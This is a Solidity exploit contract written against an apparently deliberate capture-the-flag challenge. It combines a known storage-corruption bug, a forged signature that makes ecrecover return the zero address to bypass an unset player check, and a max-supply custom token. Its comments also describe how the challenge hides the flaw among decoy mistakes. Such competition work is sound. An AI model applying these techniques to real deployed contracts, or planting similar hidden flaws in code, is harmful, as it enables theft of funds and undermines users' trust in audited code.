// SPDX-License-Identifier: None
pragma solidity >=0.8.0;

import "hardhat/console.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/**
 * The exploit requires creating a custom token, for reasons that are clear in
 * step 3
 *
 * Since we're operation on the constructor, for technical reasons the exploit
 * contract can't itself be the ERC20 (since callbacks such as
 * `safeTransferFrom` fail until the contract is fully formed)
 */
contract ExploitativeToken is ERC20 {
    constructor(uint256 supply) ERC20("Exploit", "EXPL") {
        _mint(msg.sender, supply);
    }
}

/**
 * The main exploit behind the contract is described in
 * https://www.certora.com/blog/corruptedStorage.html
 *
 * The challenge contract is vulnerable to this exploit, and that's actually
 * the only way to win the game it is suposed to implement
 *
 * There's also one other detail that's required to know: how to get address(0x) from `ecrecover`:
 * https://ethereum.stackexchange.com/questions/69328/how-to-get-the-zero-address-from-ecrecover
 * The contract has a `onlyPlayer` modifier, but the `player` variable hasn't been set
 *
 * There are a couple of other details in the contract that look like innocent mistakes
 * Such as:
 *    require(memo.length > 1, "You need to write something first")
 * which clearly should be `memo.length > 0`
 *
 * These errors are partially to obfuscate the real exploit, by making the
 * contract appear incorrect, but not necessarily exploitable.
 * It seems impossible to win the game since the logic appears broken
 *
 * However, the exploit makes it possible, which is the challenge
 */

interface IChallenge_naps62 {
    function bet(
        bytes32,
        bytes memory,
        IERC20,
        uint256,
        bytes memory
    ) external;

    function write0() external;

    function write255() external;

    function shiftLeft(uint8) external;

    function shiftRight(uint8) external;

    function setHalfByte(bytes1) external;

    function won() external view returns (bool);
}

contract Exploit_naps62 {
    IChallenge_naps62 instance;

    constructor(IChallenge_naps62 _instance) {
        instance = _instance;
    }

    function finalize() external {
        // step 1
        // create a custom ERC20
        // with the max possible supply
        IERC20 token = new ExploitativeToken(type(uint256).max);
        token.approve(address(instance), type(uint256).max);

        // step 2
        // construct a 0-byte array
        bytes memory d = new bytes(0);

        // step 3
        // construct a fake signature
        bytes32 passwordHash = 0xcf36ac4f97dc10d91fc2cbb20d718e94a8cbfe0f82eaedc6a4aa38946fb797cd;
        bytes32 r = 0x993dab3dd91f5c6dc28e17439be475478f5635c92a56e17e82349d3fb2f16619;
        bytes32 s = 0x6f466c0b4e0c146f285204f0dcb13e5ae67bc33f4b888ec32dfe0a063e8f3f78;
        // this is the key. this value needs to be something other than 27 or 28
        // https://ethereum.stackexchange.com/questions/69328/how-to-get-the-zero-address-from-ecrecover
        uint8 v = 0x1d;
        bytes memory sig = abi.encodePacked(r, s, v);

        // step 3
        // make a bet using a value large enough such that the first byte in
        // the amount is 0x10
        instance.bet(passwordHash, abi.encodePacked(r, s, v), token, 0x10 << 248, d);

        // step 4
        // force a `memo.push()`, which will actually not set the memory to
        // 0 but use the 0x10 that was left in storage as part of the
        // corruption bug
        instance.write0();

        // write the rest of the bytes according to normal rules of the game
        // these steps were put into place to attempt to hide the vulnerability
        // into what could pass as a (poorly-written) real contract
        // (I may still improve this aspect before the deadline)

        // second byte
        instance.write0();
        instance.setHalfByte(0x0b);
        instance.shiftLeft(4);
        instance.setHalfByte(0x05);

        // third byte
        instance.write0();
        instance.setHalfByte(0x07);
        instance.shiftLeft(4);
        instance.setHalfByte(0x0e);

        // fourth byte
        instance.write0();
        instance.setHalfByte(0x06);
        instance.shiftLeft(4);
        instance.setHalfByte(0x0d);

        instance.write0();
        instance.setHalfByte(0x0a);
        instance.shiftLeft(4);
        instance.setHalfByte(0x00);

        selfdestruct(payable(msg.sender));
    }
}
